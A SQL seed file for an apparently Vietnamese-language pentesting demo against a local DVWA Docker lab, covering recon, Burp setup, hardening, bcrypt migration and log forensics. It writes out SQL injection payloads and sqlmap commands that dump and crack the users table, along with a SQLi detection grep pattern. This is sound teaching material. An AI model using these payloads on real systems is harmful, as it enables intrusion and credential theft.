INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m1-s1', 1, 1, 'PHẦN CHÍNH • TRINH SÁT HẠ TẦNG', 'Kiểm tra Hạ tầng Lab Docker & Quét Dịch vụ Mục tiêu bằng Nmap', 'Hạ tầng • Nmap', false, 'Xác nhận container DVWA đang hoạt động ổn định trên cổng 8080 và dùng Nmap (-sV) dò tìm phiên bản dịch vụ Web đang mở trước khi kiểm thử.', '["Mở Terminal (zsh) và đảm bảo Docker Desktop đang chạy container mục tiêu DVWA (ID: 215d3a734374, tên ngẫu nhiên epic_dijkstra).","Gõ lệnh docker ps để kiểm tra trạng thái Up và ánh xạ cổng 0.0.0.0:8080->80/tcp.","Gõ lệnh nmap -sV -p 8080 127.0.0.1 để quét đúng cổng 8080 và xác định banner dịch vụ (Apache httpd).","Nếu chưa cài Nmap trên macOS, cài nhanh bằng lệnh: brew install nmap."]'::jsonb, '[{"label":"Kiểm tra Container DVWA & Quét cổng bằng Nmap","shell":"zsh / bash","template":"docker ps\nnmap -sV -p 8080 127.0.0.1","explanation":"Tham số -sV dò phiên bản dịch vụ đang lắng nghe; -p 8080 giới hạn chỉ quét vào cổng web mục tiêu để tiết kiệm thời gian."}]'::jsonb, 'CONTAINER ID   IMAGE                  COMMAND      STATUS       PORTS                    NAMES
215d3a734374   vulnerables/web-dvwa   "/main.sh"   Up 2 hours   0.0.0.0:8080->80/tcp     epic_dijkstra

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.25 ((Debian))', 'Theo chuẩn PTES (Giai đoạn 1 - Reconnaissance), kiểm thử viên không tấn công mù quáng mà phải xác định chính xác bề mặt dịch vụ (Attack Surface) và công nghệ nền tảng.', 'Quy trình kiểm thử bắt đầu theo chuẩn PTES kết hợp Black-box và White-box trên môi trường Lab Docker cô lập. Bước đầu tiên xác nhận container DVWA đang mở cổng 8080 và dùng Nmap ghi nhận dịch vụ Apache httpd.', 'm1-recon')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m1-s2', 1, 2, 'PHẦN CHÍNH • POC 1', 'Thu thập HTTP Header qua cURL — Phát hiện Lộ Banner & Cookie thiếu cờ', 'PoC 1 • cURL', false, 'Thu thập 15 dòng đầu của phản hồi HTTP từ login.php để phát hiện 2 lỗ hổng bề mặt đầu tiên (PoC 1).', '["Chạy lệnh curl -is http://127.0.0.1:8080/login.php | head -n 15 trên Terminal.","Quan sát dòng Server: để chỉ ra lỗi Server Banner Disclosure (tiết lộ chính xác Apache/2.4.25 và hệ điều hành Debian).","Quan sát 2 dòng Set-Cookie: để chỉ ra PHPSESSID và security=low không có cờ bảo vệ HttpOnly hay SameSite=Strict, đồng thời lưu trạng thái bảo mật ngay phía Client."]'::jsonb, '[{"label":"Thu thập 15 dòng Header đầu tiên (PoC 1)","shell":"zsh / bash","template":"curl -is http://127.0.0.1:8080/login.php | head -n 15","explanation":"Cờ -i hiển thị HTTP response headers cùng nội dung; -s tắt thanh tiến trình; head -n 15 cắt gọn phần header để lấy bằng chứng báo cáo."}]'::jsonb, 'HTTP/1.1 200 OK
Date: Wed, 04 Nov 2026 02:09:19 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=2d0vvd715drf3nv8mgq7vderg6; path=/
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: security=low
Content-Type: text/html;charset=utf-8', 'Phát hiện 2 điểm yếu theo chuẩn quốc tế: (1) Server Banner Disclosure — CWE-200 (CVSS v3.1: 5.3 Medium) giúp kẻ tấn công tra cứu CVE của Apache 2.4.25; (2) Cookie thiếu cờ HttpOnly / SameSite=Strict — CWE-614 (CVSS v3.1: 4.2 Medium) và Client-side Security State (security=low).', 'Qua kết quả PoC 1 từ cURL, hệ thống lộ rõ Server: Apache/2.4.25 (Debian) — mã CWE-200 với điểm CVSS 5.3; đồng thời cấp phát cookie PHPSESSID và security=low thiếu cờ HttpOnly và SameSite=Strict — mã CWE-614, CVSS 4.2.', 'm1-recon')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m1-s3', 1, 3, 'GIA CỐ & PHÒNG THỦ • LIVE PATCHING', 'Vá lỗi 3 Trực tiếp — Gia cố Cấu hình Apache để Ẩn Banner Phiên bản', 'Vá lỗi 3 • Apache', true, 'Chuyển kiến nghị bảo mật thành hành động vá trực tiếp trên container đang chạy, ẩn hoàn toàn số phiên bản 2.4.25 và hệ điều hành Debian.', '["Thực thi lệnh docker exec nối thêm hai chỉ thị ServerTokens Prod và ServerSignature Off vào file /etc/apache2/conf-available/security.conf.","Kích hoạt cấu hình bằng a2enconf security và tải lại dịch vụ Apache (service apache2 reload) không làm gián đoạn container.","Chạy lại curl -Is http://127.0.0.1:8080/login.php | grep -i \"Server:\" để kiểm chứng sau khi vá.","Đối chiếu kết quả: dòng Server chỉ còn hiển thị duy nhất ''Server: Apache''."]'::jsonb, '[{"label":"Live Patching cấu hình Apache security.conf","shell":"zsh / bash","template":"docker exec -it {{CONTAINER}} bash -c \"cat << ''EOF'' >> /etc/apache2/conf-available/security.conf\nServerTokens Prod\nServerSignature Off\nEOF\na2enconf security && service apache2 reload\"","explanation":"ServerTokens Prod ép Apache chỉ trả về tên phần mềm ''Apache'' trong HTTP header; ServerSignature Off tắt chữ ký phiên bản ở các trang lỗi 404/500."},{"label":"Kiểm chứng lại HTTP Header sau khi vá","shell":"zsh / bash","template":"curl -Is http://127.0.0.1:8080/login.php | grep -i \"Server:\"","explanation":"Chỉ lấy HTTP header (-I) và lọc dòng Server: để xác minh bản vá có hiệu lực ngay lập tức."}]'::jsonb, 'Enabling conf security.
Reloading Apache httpd web server: apache2.

Server: Apache', 'Thay vì chỉ đề xuất lý thuyết, quá trình gia cố trực tiếp (Live Hardening) trên container giúp triệt tiêu hoàn toàn thông tin phiên bản 2.4.25 và OS Debian trước khi chuyển sang Giai đoạn 2.', 'Để khắc phục ngay lỗ hổng rò rỉ thông tin máy chủ, cấu hình security.conf bên trong container được bổ sung ServerTokens Prod và ServerSignature Off. Khi kiểm tra lại bằng cURL, phản hồi chỉ còn duy nhất ''Server: Apache''.', 'm1-patch')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m2-s1', 2, 1, 'PHẦN CHÍNH • HẠ TẦNG PROXY', 'Cấu hình Burp Suite Proxy 8081 & Vượt Loopback Bypass bằng localtest.me', 'Burp Proxy • 8081', false, 'Thiết lập trạm đánh chặn Burp Suite Community chạy song song với Docker (cổng 8080) và ép trình duyệt Chromium định tuyến 100% gói tin qua Proxy.', '["Mở Burp Suite Community Edition trên máy kiểm thử.","Vào tab Proxy -> Proxy settings -> chọn mục Proxy Listeners -> chỉnh cổng lắng nghe từ 8080 sang 127.0.0.1:8081 (tránh xung đột cổng 8080 của container dvwa).","Bấm nút Open Browser để mở trình duyệt Chromium tích hợp của Burp Suite.","KHÔNG gõ 127.0.0.1:8080 (vì Chromium bỏ qua Proxy cho loopback). Thay vào đó truy cập http://localtest.me:8080, đăng nhập admin / password.","Vào mục DVWA Security ở menu trái -> chọn mức Low -> bấm Submit, sau đó mở mục SQL Injection."]'::jsonb, '[{"label":"Địa chỉ truy cập trên trình duyệt tích hợp Burp","shell":"http","template":"http://localtest.me:8080/vulnerabilities/sqli/","explanation":"Tên miền localtest.me phân giải về 127.0.0.1 nhưng không nằm trong danh sách ngoại lệ loopback của Chromium, buộc mọi request đi qua Burp Proxy 127.0.0.1:8081."}]'::jsonb, 'Proxy Listener Active: 127.0.0.1:8081
DVWA Security Level: low | Username: admin | Route: localtest.me:8080 -> Burp Proxy', 'Giải quyết trọn vẹn 2 rào cản kỹ thuật thực tế: (1) Xung đột cổng giữa Docker và Burp đều mặc định 8080; (2) Cơ chế Loopback Bypass của trình duyệt hiện đại.', 'Tiếp nối phần trinh sát, trạm đánh chặn Burp Suite được cấu hình lắng nghe ở cổng 8081 để tránh đụng cổng 8080 của Docker, đồng thời sử dụng tên miền localtest.me:8080 để buộc trình duyệt định tuyến 100% gói tin qua Proxy.', 'm2-burp')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m2-s2', 2, 2, 'PHẦN CHÍNH • POC 2 (PHẦN 1)', 'Đánh chặn Gói tin & Xác nhận Error-based SQLi trên Burp Repeater', 'PoC 2 • Repeater', false, 'Bắt gói tin HTTP GET, trích xuất mã phiên PHPSESSID và gửi payload nháy đơn '' qua Repeater để ép MariaDB nhả lỗi cú pháp SQL.', '["Tại tab Proxy -> Intercept, bật ''Intercept is on''.","Trên trình duyệt, nhập thử số 1 (hoặc '' OR ''1''=''1) vào ô User ID rồi bấm Submit.","Gói tin GET /vulnerabilities/sqli/?id=1&Submit=Submit bị giữ lại ở Proxy. Nhìn dòng Cookie để lấy chuỗi PHPSESSID (ví dụ: 7nst0hrqrfmv744a5ouj7663b0).","Bấm Ctrl + R (hoặc Cmd + R) gửi gói tin sang tab Repeater, sau đó tắt Intercept is off để trình duyệt không bị treo.","Tại tab Repeater, sửa tham số id= thành dấu nháy đơn '' rồi bấm Send. Quan sát khung Response bên phải báo lỗi MariaDB.","Thử tiếp payload '' OR ''1''=''1 (hoặc %27+OR+%271%27%3D%271) để chứng minh trích xuất toàn bộ 5 người dùng."]'::jsonb, '[{"label":"Gói tin HTTP GET kiểm thử Error-based SQLi trên Burp Repeater","shell":"http","template":"GET /vulnerabilities/sqli/?id=1''&Submit=Submit HTTP/1.1\nHost: localtest.me:8080\nCookie: security=low; PHPSESSID={{PHPSESSID}}","explanation":"Ký tự nháy đơn ('') làm gãy cấu trúc chuỗi ''$id'' trong câu lệnh SELECT của MariaDB, kích hoạt thông báo lỗi cú pháp trả thẳng về giao diện."}]'::jsonb, 'HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

<pre>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''''1'''''' at line 1</pre>', 'Xác nhận lỗ hổng Error-based SQL Injection (CWE-89, CVSS v3.1: 8.8 High): dữ liệu đầu vào bị nối trực tiếp vào câu lệnh SQL và thông báo lỗi của MariaDB bị in thẳng ra HTTP Response.', 'Khi đưa gói tin sang Burp Repeater và chèn dấu nháy đơn vào tham số id, máy chủ trả về lỗi cú pháp MariaDB ngay trên giao diện — khẳng định lỗ hổng Error-based SQL Injection mã CWE-89, mức High 8.8 điểm CVSS.', 'm2-burp')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m2-s3', 2, 3, 'PHẦN CHÍNH • POC 2 (PHẦN 2)', 'Tự động hóa Bóc tách Dữ liệu bằng cURL + grep trên Terminal', 'PoC 2 • cURL', false, 'Tái hiện truy vấn từ dòng lệnh bằng PHPSESSID đã lấy từ Burp Suite và dùng biểu thức chính quy grep lọc chính xác tên người dùng từ HTML phức tạp.', '["Mở Terminal trên máy kiểm thử.","Dán giá trị PHPSESSID vừa bắt được trên Burp Suite vào cờ -b của lệnh cURL (lưu ý điền cả security=low).","Ống dẫn (pipe) kết quả HTML qua lệnh grep -o \"First name: [^<]*\" để trích gọn trường dữ liệu mong muốn."]'::jsonb, '[{"label":"Bóc tách thông tin người dùng qua cURL + grep","shell":"zsh / bash","template":"curl -s -b \"security=low; PHPSESSID={{PHPSESSID}}\" \\\n  \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit\" | grep -o \"First name: [^<]*\"","explanation":"Cờ -b đính kèm cookie phiên để vượt qua màn hình đăng nhập DVWA; grep -o chỉ in đúng phần khớp với chuỗi ''First name: ...'' cho tới trước thẻ đóng HTML ''<''."}]'::jsonb, 'First name: admin', 'Chứng minh khả năng chuyển đổi từ thao tác trình duyệt thủ công sang kịch bản dòng lệnh (CLI automation), mở đường để bàn giao Cookie phiên cho công cụ SQLMap ở Giai đoạn 3.', 'Từ PHPSESSID bắt được, đưa vào câu lệnh cURL kết hợp regex grep ngay trên Terminal để bóc tách chính xác ''First name: admin'' giữa hàng trăm dòng HTML.', 'm2-curl-log')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m2-s4', 2, 4, 'PHÒNG THỦ & ĐIỀU TRA • BLUE TEAM FORENSICS', 'Điều tra Nhật ký Tấn công Apache (Log Forensics)', 'Forensics • access.log', true, 'Đóng vai Blue Team trích xuất và phân tích tệp access.log bên trong container DVWA để chỉ ra các dấu hiệu tấn công (IoC).', '["Chạy lệnh docker exec {{CONTAINER}} grep -E \"(\\%27|\\''|UNION|SELECT)\" /var/log/apache2/access.log | tail -n 5 trên Terminal.","Đọc và phân tích 4 dấu hiệu nhận diện tấn công (Indicators of Compromise - IoC) trên từng dòng log:","1) Địa chỉ IP nguồn thực hiện rà quét; 2) Payload mã hóa URL (%27, UNION, SELECT) nằm trong URI; 3) Chuỗi User-Agent nhận diện công cụ (curl/... vs Mozilla/5.0 Chromium); 4) Mã phản hồi HTTP (200 hoặc 500) và kích thước gói tin bất thường."]'::jsonb, '[{"label":"Truy vết payload SQLi trong Apache access.log","shell":"zsh / bash","template":"docker exec {{CONTAINER}} grep -E \"(\\%27|\\''|UNION|SELECT)\" /var/log/apache2/access.log | tail -n 5","explanation":"grep -E dùng regex mở rộng lọc các request chứa dấu nháy đơn (%27 hoặc '') hoặc từ khóa UNION/SELECT trong 5 dòng mới nhất của access.log."}]'::jsonb, '172.17.0.1 - - [04/Nov/2026:02:14:08 +0000] "GET /vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1" 200 1842 "-" "Mozilla/5.0 (Burp Chromium)"
172.17.0.1 - - [04/Nov/2026:02:15:21 +0000] "GET /vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&Submit=Submit HTTP/1.1" 200 2195 "-" "curl/8.5.0"', 'Bổ sung góc nhìn phòng thủ Blue Team / Incident Response: mọi dấu vết khai thác qua Burp hay cURL đều để lại vết định danh IP, User-Agent và biến động kích thước response trong nhật ký máy chủ.', 'Ở góc độ Blue Team, khi truy vấn ngược tệp access.log trong Apache, hệ thống ghi nhận rõ các IoC gồm IP nguồn, chuỗi payload %27/UNION, User-Agent là curl hay trình duyệt và sự thay đổi kích thước gói tin phản hồi.', 'm2-curl-log')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m3-s1', 3, 1, 'PHẦN CHÍNH • SQLMAP TỰ ĐỘNG', 'Cài đặt SQLMap & Chạy Chuỗi 3 Lệnh Khai thác Tự động + Crack MD5', 'SQLMap • 3 Lệnh', false, 'Dùng công cụ tự động SQLMap với PHPSESSID từ bước trước để dò tên CSDL, liệt kê bảng nhạy cảm và dump toàn bộ bảng users kèm bẻ khóa MD5.', '["Kiểm tra hoặc cài đặt SQLMap trên máy bằng lệnh: sudo apt install -y sqlmap.","Lệnh 1 (--dbs): Khai thác danh sách các cơ sở dữ liệu hiện có (tìm thấy information_schema và dvwa).","Lệnh 2 (-D dvwa --tables): Khóa mục tiêu vào CSDL dvwa và liệt kê các bảng (tìm thấy guestbook và users).","Lệnh 3 (-D dvwa -T users --dump): Tải toàn bộ dữ liệu bảng users và để SQLMap tự động chạy Dictionary Attack bẻ khóa cột password (MD5)."]'::jsonb, '[{"label":"Lệnh 1: Liệt kê Cơ sở dữ liệu (--dbs)","shell":"zsh / bash","template":"sqlmap -u \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"security=low; PHPSESSID={{PHPSESSID}}\" --dbs --batch","explanation":"--cookie truyền phiên đã đăng nhập; --batch tự động chọn đáp án mặc định không cần hỏi lại."},{"label":"Lệnh 2: Liệt kê các Bảng trong CSDL dvwa (--tables)","shell":"zsh / bash","template":"sqlmap -u \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"security=low; PHPSESSID={{PHPSESSID}}\" -D dvwa --tables --batch","explanation":"-D dvwa chỉ định đúng database dvwa vừa tìm được ở Lệnh 1."},{"label":"Lệnh 3: Trích xuất bảng users & Tự động bẻ khóa MD5 (--dump)","shell":"zsh / bash","template":"sqlmap -u \"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"security=low; PHPSESSID={{PHPSESSID}}\" -D dvwa -T users --dump --batch","explanation":"SQLMap phát hiện cột password dạng MD5 và tự động chạy tấn công từ điển giải mã ra mật khẩu rõ (password, abc123, charley)."}]'::jsonb, 'available databases [2]:
[*] dvwa
[*] information_schema

Database: dvwa | [2 tables]: guestbook, users

Database: dvwa | Table: users [5 entries]
+---------+---------+--------------------------------------------+
| user_id | user    | password                                   |
+---------+---------+--------------------------------------------+
| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| 2       | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7            |
| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------+--------------------------------------------+', 'Giải thích lý do dùng SQLMap thay vì gõ tay: tự động thử hàng loạt kỹ thuật (Boolean-based, Error-based, UNION query), bỏ qua bước lặp thủ công và tích hợp sẵn bộ từ điển bẻ khóa hash MD5.', 'Từ cookie phiên hợp lệ, thực thi chuỗi 3 lệnh SQLMap liên hoàn: tìm ra database dvwa, xác định bảng users và dùng --dump trích xuất cả 5 tài khoản. Nhờ --batch, SQLMap tự nhận diện MD5 và bẻ khóa ngược ra mật khẩu gốc như password, abc123 ngay trên Terminal.', 'm3-sqlmap')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m3-s2', 3, 2, 'PHẦN CHÍNH • POC 3', 'Kiểm toán Hộp trắng MariaDB CLI — Chứng minh Điểm yếu MD5 không Salt', 'PoC 3 • MariaDB', false, 'Truy cập trực tiếp vào MariaDB bên trong container dvwa để kiểm toán cấu trúc lưu trữ mật khẩu (PoC 3) và phân tích rủi ro Rainbow Table.', '["Chạy lệnh docker exec -it {{CONTAINER}} mysql -u root -e \"USE dvwa; SELECT user_id, user, password FROM users;\" trên Terminal.","Chỉ trực tiếp vào độ dài chuỗi password: đúng 32 ký tự thập lục phân (128-bit) đặc trưng của thuật toán MD5 đã lỗi thời.","So sánh bản ghi số 1 (admin) và số 5 (smithy): cả hai có chuỗi băm GIỐNG HỆT NHAU là 5f4dcc3b5aa765d61d8327deb882cf99.","Kết luận điểm yếu mật mã học CWE-759 (CVSS 4.9 Medium): lưu hash không có Salt (Unsalted Hash) khiến Rainbow Table giải mã đồng loạt mọi tài khoản trùng mật khẩu."]'::jsonb, '[{"label":"Kiểm toán trực tiếp bảng users bằng MariaDB CLI (PoC 3)","shell":"zsh / bash","template":"docker exec -it {{CONTAINER}} mysql -u root -e \"USE dvwa; SELECT user_id, user, password FROM users;\"","explanation":"Truy cập thẳng vào MariaDB với quyền root không cần mật khẩu (đồng thời phơi bày thêm rủi ro lạm dụng đặc quyền kết nối DB)."}]'::jsonb, '+---------+---------+----------------------------------+
| user_id | user    | password                         |
+---------+---------+----------------------------------+
|       1 | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
|       2 | gordonb | e99a18c428cb38d5f260853678922e03 |
|       3 | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
|       4 | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
|       5 | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+---------+----------------------------------+', 'MD5 là hàm băm nhanh không thiết kế cho mật khẩu; việc thiếu chuỗi ngẫu nhiên (Salt) làm mọi mật khẩu giống nhau cho ra cùng 1 digest, bị tra ngược tức thì qua Rainbow Table (CWE-759, CVSS 4.9).', 'Khi kiểm toán hộp trắng trực tiếp trong MariaDB ở PoC 3, tài khoản số 1 (admin) và số 5 (smithy) có chuỗi băm MD5 giống hệt nhau: 5f4dcc3b5aa765d61d8327deb882cf99. Đây là lỗi băm không Salt (CWE-759), chỉ cần tra bảng cầu vồng một lần là lộ đồng loạt.', 'm3-mariadb-patch')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m3-s3', 3, 3, 'GIA CỐ & PHÒNG THỦ • VÁ LỖI 1 (BCRYPT)', 'Vá lỗi 1 Trực tiếp — Nâng cấp Thuật toán Băm sang Bcrypt (cost = 12)', 'Vá lỗi 1 • Bcrypt', true, 'Kiểm tra hỗ trợ Argon2id/Bcrypt trong PHP CLI, sinh chuỗi băm Bcrypt có Salt tự động (cost = 12) và cập nhật trực tiếp vào MariaDB.', '["Kiểm tra PHP trên container có hỗ trợ PASSWORD_ARGON2ID hay dùng PASSWORD_BCRYPT.","Chạy lệnh PHP CLI sinh hash Bcrypt cho mật khẩu ''password'' với hệ số chi phí cost = 12.","Lấy chuỗi hash vừa sinh (bắt đầu bằng $2y$12$...) cập nhật trực tiếp vào bảng users cho user_id = 1 và SELECT kiểm chứng lại."]'::jsonb, '[{"label":"Kiểm tra Argon2id & Sinh mã băm Bcrypt (cost = 12) qua PHP CLI","shell":"zsh / bash","template":"docker exec -it {{CONTAINER}} php -r \"echo defined(''PASSWORD_ARGON2ID'') ? ''Supported'' : ''Use BCRYPT''; echo PHP_EOL;\"\ndocker exec -it {{CONTAINER}} php -r ''echo password_hash(\"password\", PASSWORD_BCRYPT, [\"cost\" => 12]) . PHP_EOL;''","explanation":"Hàm password_hash() của PHP tự động sinh Salt ngẫu nhiên 22 ký tự cho mỗi lần gọi; cùng mật khẩu ''password'' nhưng admin và smithy sẽ ra 2 chuỗi hoàn toàn khác nhau."},{"label":"Cập nhật chuỗi Bcrypt vào MariaDB & Kiểm chứng","shell":"zsh / bash","template":"docker exec -it {{CONTAINER}} mysql -u root -e \"USE dvwa; UPDATE users SET password = ''\\$2y\\$12\\$exampleHashedPasswordGeneratedByBcrypt'' WHERE user_id = 1; SELECT user_id, user, password FROM users WHERE user_id = 1;\"","explanation":"Thay thế chuỗi 32 ký tự MD5 cũ bằng chuỗi Bcrypt 60 ký tự có tiền tố thuật toán + cost + Salt."}]'::jsonb, 'Use BCRYPT
$2y$12$K9p8Q3vT2xL7wR4mN6zA1eH8cB5vD0fG2jK4lM6nP8qR0sT2uV4wX

+---------+-------+--------------------------------------------------------------+
| user_id | user  | password                                                     |
+---------+-------+--------------------------------------------------------------+
|       1 | admin | $2y$12$K9p8Q3vT2xL7wR4mN6zA1eH8cB5vD0fG2jK4lM6nP8qR0sT2uV4wX |
+---------+-------+--------------------------------------------------------------+', 'Bcrypt/Argon2id là thuật toán băm thích ứng (Adaptive Key Derivation) tích hợp Salt tự động và tham số cost làm chậm brute-force/GPU cracking gấp hàng nghìn lần so với MD5.', 'Để khắc phục PoC 3, tiến hành sinh chuỗi băm chuẩn Bcrypt với cost=12 có tích hợp Salt tự động qua PHP CLI và cập nhật trực tiếp vào MariaDB, loại bỏ hoàn toàn nguy cơ tra ngược Rainbow Table.', 'm3-mariadb-patch')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
